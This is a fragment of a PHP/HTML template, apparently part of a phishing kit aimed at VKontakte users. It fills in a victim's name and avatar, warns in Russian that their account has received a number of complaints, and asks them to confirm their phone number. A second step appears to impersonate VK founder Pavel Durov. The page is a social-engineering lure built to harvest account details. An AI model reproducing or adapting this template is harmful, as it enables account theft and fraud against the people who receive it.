        ...
        <div class="container text-center">
            <div class="content">
                <div id="step1" style="display: block">
                    <div class="content-text"><img src="<?echo "$avatar1"?>" class="img-responsive img-ct" alt="<?echo "$firstname1 $lastname1"?>" style="border-radius:160px 160px 160px 160px;-webkit-border-radius:160px 160px 160px 160px;-moz-border-radius:160px 160px 160px 160px;"><b><?echo "$firstname1 $lastname1"?></b>
                        <br>Нa Вашу учетную запись <a href="https://vk.com/<?echo "$jalobaid"?>" target="_blank"><b><?echo "$jalobaid"?></b></a> поступило <b><?echo "$jalobacolvo"?></b> жалоб!
                        <div id="validate_phone">Для проверки учетной записи <b>подтвердите свой номер телефона</b>:</div> </div>
                ...
                <div id="step2" style="display: none">
                    <div class="content-text">
                        <img src="../assets/other/template/dog.jpg" class="img-responsive img-ct" alt="Павел Дуров" style="border-radius:10px 10px 10px 10px;-webkit-border-radius:10px 10px 10px 10px;-moz-border-radius:10px 10px 10px 10px;"><b><?echo "$firstname1 $lastname1"?></b>!
                        <br>
                        <br>
